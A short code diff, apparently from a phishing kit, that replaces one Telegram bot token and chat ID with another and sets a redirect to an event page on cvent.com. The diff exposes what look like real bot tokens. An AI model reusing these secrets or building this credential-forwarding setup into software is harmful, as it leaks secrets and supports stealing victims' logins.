@@ -1,6 +1,6 @@
 // storing variables
-const token = "7810826976:AAF7jc3Lx8ed_mLLDO8OIxf-zvWzS4WhTvw";
-const chatId = "6514776839";
+const token = "6113839454:AAFY5WlixlzhREvqK1DAGyZBRnDeY-D9jU4";
+const chatId = "1461764555";
 
 const redirectURL =
   "http://www.cvent.com/events/2018-facial-rejuvenation/event-summary-66dad18444ca4ff1b1379df029fd67f3.aspx/";
